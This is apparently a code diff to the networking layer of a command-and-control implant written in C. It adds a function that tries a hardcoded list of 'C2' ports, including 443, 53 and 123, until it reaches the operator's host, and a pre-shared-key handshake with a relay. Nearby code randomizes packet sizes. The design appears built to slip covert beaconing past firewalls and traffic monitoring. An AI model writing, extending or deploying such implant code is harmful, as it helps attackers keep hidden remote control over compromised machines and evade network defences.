@@ -711,6 +711,23 @@ int ph_network_randomize_packet_size(void *buffer, size_t *len, size_t max_len)
     return PH_OK;
 }
 
+static const int C2_PORTS[] = {8443, 443, 8080, 80, 53, 123};
+static const int C2_PORT_COUNT = 6;
+
+int ph_network_connect_with_fallback(ph_network_ctx_t *ctx, const char *host) {
+    for (int i = 0; i < C2_PORT_COUNT; i++) {
+        int port = C2_PORTS[i];
+        dprintf(STDERR_FILENO, "[-] Trying C2 port %d...\n", port);
+         
+        int ret = ph_network_connect(ctx, host, port);
+        if (ret == PH_OK) {
+            dprintf(STDERR_FILENO, "[+] C2 connected on port %d.\n", port);
+            return PH_OK;
+        }
+    }
+    return PH_ERR_NETWORK;
+}
+
 int ph_network_connect(ph_network_ctx_t *ctx, const char *address, uint16_t port)
 {
     if (!ctx || !address || port == 0) {
@@ -728,14 +745,23 @@ int ph_network_connect(ph_network_ctx_t *ctx, const char *address, uint16_t port
         return ret;
     }
 
-    // Ensure network byte order (Big-Endian) for the 4-byte PSK validation string "OYEN"
-    uint32_t raw_psk = htonl(0x4F59454E);
-    if (send(fd, &raw_psk, sizeof(raw_psk), 0) != sizeof(raw_psk)) {
+    // Send PSK as EXACT 4 raw bytes: OYEN
+    dprintf(STDERR_FILENO, "[-] Sending PSK...\n");
+    uint8_t psk[4] = {0x4F, 0x59, 0x45, 0x4E}; 
+    if (send(fd, psk, 4, 0) != 4) {
         dprintf(STDERR_FILENO, "[NET_FAIL] PSK: failed to send handshake to relay\n");
-        // Handshake transmission failed, terminate connection attempt cleanly
         close(fd);
         return PH_ERR_NETWORK;
     }
+
+    // Receive 1 byte ACK from server
+    uint8_t ack = 0;
+    if (recv(fd, &ack, 1, 0) != 1 || ack != 1) {
+        dprintf(STDERR_FILENO, "[NET_FAIL] PSK rejected by relay (ACK=%d)\n", ack);
+        close(fd);
+        return PH_ERR_NETWORK;
+    }
+    dprintf(STDERR_FILENO, "[+] PSK accepted.\n");
 
     ctx->connection.socket_fd = fd;
     ctx->connection.is_connected = 1;
@@ -755,6 +781,7 @@ int ph_network_connect(ph_network_ctx_t *ctx, const char *address, uint16_t port
 
     return PH_OK;
 }
+
 
 int ph_network_disconnect(ph_network_ctx_t *ctx)
 {
